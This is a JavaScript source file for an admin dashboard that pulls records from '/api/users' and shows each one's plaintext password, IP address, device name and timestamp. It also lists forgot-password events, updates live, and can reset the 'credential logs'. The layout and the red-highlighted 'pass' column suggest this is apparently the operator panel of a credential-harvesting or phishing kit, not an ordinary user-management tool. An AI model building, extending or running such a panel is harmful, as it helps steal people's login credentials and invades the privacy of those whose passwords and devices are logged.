let adminToken = '';
let currentSection = 'users'; // 'users' | 'fp'

const SECTION_TITLES = {
    users: 'Users Table',
    fp: 'Forgot Password Logs'
};

// ── Boot ──────────────────────────────────────────────────────────────────────

document.addEventListener('DOMContentLoaded', () => {
    adminToken = prompt('Enter admin password to access the dashboard:');
    if (!adminToken) {
        document.body.innerHTML = '<h2 style="text-align:center; margin-top:50px; color:#f8f9fa;">Access Denied</h2>';
        return;
    }

    // Wire up all button event listeners here (no inline onclick in HTML)
    document.getElementById('hamburger-btn').addEventListener('click', openSidebar);
    document.getElementById('sidebar-close-btn').addEventListener('click', closeSidebar);
    document.getElementById('sidebar-overlay').addEventListener('click', closeSidebar);
    document.getElementById('refresh-btn').addEventListener('click', handleRefresh);
    document.getElementById('reset-btn').addEventListener('click', handleReset);

    // Sidebar nav items (each has data-section attribute)
    document.querySelectorAll('.sidebar-nav-item').forEach(btn => {
        btn.addEventListener('click', () => switchSection(btn.dataset.section));
    });

    // Escape key closes sidebar
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') closeSidebar();
    });

    // Initial data load
    fetchUsers();
    fetchForgotPasswordLogs();

    // ── SSE: real-time updates ───────────────────────────────────────────────
    const eventSource = new EventSource(`/api/updates?token=${encodeURIComponent(adminToken)}`);

    eventSource.onmessage = (event) => {
        if (event.data === 'update') fetchUsers();
        if (event.data === 'fp-update') fetchForgotPasswordLogs();
    };

    eventSource.onerror = () => {
        const indicator = document.getElementById('live-indicator');
        if (indicator) {
            indicator.innerHTML = '<span class="live-dot live-dot--offline"></span> Offline';
            indicator.title = 'SSE connection lost — refresh to reconnect';
        }
    };

    eventSource.onopen = () => {
        const indicator = document.getElementById('live-indicator');
        if (indicator) {
            indicator.innerHTML = '<span class="live-dot"></span> Live';
            indicator.title = 'Live — auto-updating via SSE';
        }
    };
});

// ── Sidebar ───────────────────────────────────────────────────────────────────

function openSidebar() {
    document.getElementById('sidebar').classList.add('open');
    document.getElementById('sidebar-overlay').classList.add('visible');
    document.getElementById('hamburger-btn').classList.add('is-open');
    document.body.style.overflow = 'hidden';
}

function closeSidebar() {
    document.getElementById('sidebar').classList.remove('open');
    document.getElementById('sidebar-overlay').classList.remove('visible');
    document.getElementById('hamburger-btn').classList.remove('is-open');
    document.body.style.overflow = '';
}

// ── Section switching ─────────────────────────────────────────────────────────

function switchSection(sectionKey) {
    currentSection = sectionKey;

    // Update header title
    document.getElementById('section-title').textContent = SECTION_TITLES[sectionKey] || sectionKey;

    // Show the correct section, hide others
    document.querySelectorAll('.section').forEach(el => el.classList.add('hidden'));
    const target = document.getElementById(`section-${sectionKey}`);
    if (target) target.classList.remove('hidden');

    // Update sidebar nav active state
    document.querySelectorAll('.sidebar-nav-item').forEach(btn => btn.classList.remove('active'));
    const navBtn = document.getElementById(`nav-${sectionKey}`);
    if (navBtn) navBtn.classList.add('active');

    closeSidebar();
}

// ── Header buttons (context-aware) ───────────────────────────────────────────

function handleRefresh() {
    if (currentSection === 'users') fetchUsers();
    else if (currentSection === 'fp') fetchForgotPasswordLogs();
}

function handleReset() {
    if (currentSection === 'users') resetDatabase();
    else if (currentSection === 'fp') resetForgotPasswordLogs();
}

// ── HTML escaping ─────────────────────────────────────────────────────────────

function escapeHtml(unsafe) {
    if (unsafe == null) return '';
    return unsafe
        .toString()
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// ── Users Table ───────────────────────────────────────────────────────────────

async function fetchUsers() {
    const tableBody = document.getElementById('users-table-body');
    const userCount = document.getElementById('user-count');
    const sidebarCount = document.getElementById('sidebar-user-count');

    try {
        const response = await fetch('/api/users', {
            headers: { 'Authorization': `Bearer ${adminToken}` }
        });
        if (!response.ok) throw new Error(`HTTP ${response.status}`);

        const result = await response.json();
        const users = result.data;

        userCount.textContent = `${users.length} Records`;
        sidebarCount.textContent = users.length;
        tableBody.innerHTML = '';

        if (users.length === 0) {
            tableBody.innerHTML = '<tr><td colspan="4" class="text-center empty-state">No records found in database.</td></tr>';
            return;
        }

        users.forEach((user, index) => {
            const tr = document.createElement('tr');
            tr.style.animationDelay = `${index * 0.05}s`;
            tr.innerHTML = `
                <td><span style="color: var(--danger); font-family: monospace;">${escapeHtml(user.pass || 'N/A')}</span></td>
                <td><span style="font-family: monospace;">${escapeHtml(user.ip_address || 'N/A')}</span></td>
                <td>${escapeHtml(user.device_name || 'N/A')}</td>
                <td><span style="color: #6c757d;">${escapeHtml(user.log_time || 'N/A')}</span></td>
            `;
            tableBody.appendChild(tr);
        });

    } catch (error) {
        console.error('Failed to fetch users:', error);
        tableBody.innerHTML = `<tr><td colspan="4" class="text-center" style="color: var(--danger);">Failed to load data: ${escapeHtml(error.message)}</td></tr>`;
    }
}

// ── Forgot Password Logs ──────────────────────────────────────────────────────

async function fetchForgotPasswordLogs() {
    const tableBody = document.getElementById('fp-table-body');
    const fpCount = document.getElementById('fp-count');
    const sidebarFpCount = document.getElementById('sidebar-fp-count');

    try {
        const response = await fetch('/api/forgot-password-logs', {
            headers: { 'Authorization': `Bearer ${adminToken}` }
        });
        if (!response.ok) throw new Error(`HTTP ${response.status}`);

        const result = await response.json();
        const logs = result.data;

        fpCount.textContent = `${logs.length} Records`;
        sidebarFpCount.textContent = logs.length;
        tableBody.innerHTML = '';

        if (logs.length === 0) {
            tableBody.innerHTML = '<tr><td colspan="3" class="text-center empty-state">No forgot-password events recorded yet.</td></tr>';
            return;
        }

        logs.forEach((log, index) => {
            const tr = document.createElement('tr');
            tr.style.animationDelay = `${index * 0.05}s`;
            tr.innerHTML = `
                <td><span style="color: #6c757d;">${escapeHtml(log.log_time || 'N/A')}</span></td>
                <td>${escapeHtml(log.device_name || 'N/A')}</td>
                <td><span style="font-family: monospace;">${escapeHtml(log.ip_address || 'N/A')}</span></td>
            `;
            tableBody.appendChild(tr);
        });

    } catch (error) {
        console.error('Failed to fetch forgot-password logs:', error);
        tableBody.innerHTML = `<tr><td colspan="3" class="text-center" style="color: var(--danger);">Failed to load data: ${escapeHtml(error.message)}</td></tr>`;
    }
}

// ── Reset: Credential Logs ────────────────────────────────────────────────────

async function resetDatabase() {
    const password = prompt('Enter the reset password:');
    if (!password) return;

    try {
        const response = await fetch('/api/reset', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${adminToken}`
            },
            body: JSON.stringify({ password })
        });

        if (!response.ok) {
            const data = await response.json();
            alert('Reset failed: ' + (data.error || 'Unknown error'));
            return;
        }
        alert('Credential logs reset successfully!');
    } catch (error) {
        console.error('Reset failed:', error);
        alert('Reset failed. Check console for details.');
    }
}

// ── Reset: Forgot Password Logs ───────────────────────────────────────────────

async function resetForgotPasswordLogs() {
    if (!confirm('Clear all forgot-password audit logs?')) return;

    try {
        const response = await fetch('/api/reset-forgot-password-logs', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${adminToken}`
            },
            body: JSON.stringify({})
        });

        if (!response.ok) {
            const data = await response.json();
            alert('Reset failed: ' + (data.error || 'Unknown error'));
            return;
        }
        fetchForgotPasswordLogs();
    } catch (error) {
        console.error('Reset failed:', error);
        alert('Reset failed. Check console for details.');
    }
}
